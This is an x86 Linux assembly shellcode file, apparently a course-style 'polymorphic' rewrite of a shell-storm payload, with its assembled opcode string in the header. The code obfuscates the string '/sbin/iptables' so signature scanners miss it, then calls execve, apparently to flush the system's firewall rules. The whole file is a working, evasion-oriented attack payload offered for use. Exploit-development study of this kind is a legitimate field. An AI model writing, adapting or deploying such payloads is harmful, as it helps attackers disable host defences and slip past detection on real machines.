; Polymorphed version of shellcode-368.php from shell-storm
; Author: Danijel Ilisin / @dab00ze
; http://dilsec.com
;
; Nothing fancy, just obfuscating the string
;
; new shellcode: "\x31\xd2\x52\x66\x68\x6d\x42\x89\xe6\x52\xbb\x77\x33\x31\x00\xc1"
;                "\xeb\x04\x68\x2b\x59\x62\x73\x01\x1c\x24\x68\x32\x5d\x71\x61\x01"
;                "\x1c\x24\x89\xe7\x68\x2b\x56\x6b\x2f\x01\x1c\x24\x68\xf8\x1b\x2c"
;                "\x73\x01\x1c\x24\x89\xe3\x52\x56\x57\x89\xe1\x31\xc0\xb0\x0b\xcd"
;               "\x80"
; that's 65 bytes (144,4% size of the original shellcode)

global _start			

section .text
_start:
    xor         edx, edx
    push        edx
    push        word 0x426d
    mov         esi, esp
    push        edx
    mov         ebx, 0x313377
    shr         ebx, 4
    push        0x7362592B
    add         dword [esp], ebx ; 'selb' modified
    push        0x61715D32
    add         dword [esp], ebx ; 'atpi' modified
    mov         edi, esp
    push        0x2F6B562B
    add         dword [esp], ebx ; '/nib' modified
    push        0x732C1BF8      ; s///
    add         dword [esp], ebx ; 's///' modified
    mov         ebx, esp
    push        edx
    push        esi
    push        edi
    mov         ecx, esp
    xor         eax, eax
    mov         al, 0xb
    int         0x80
    
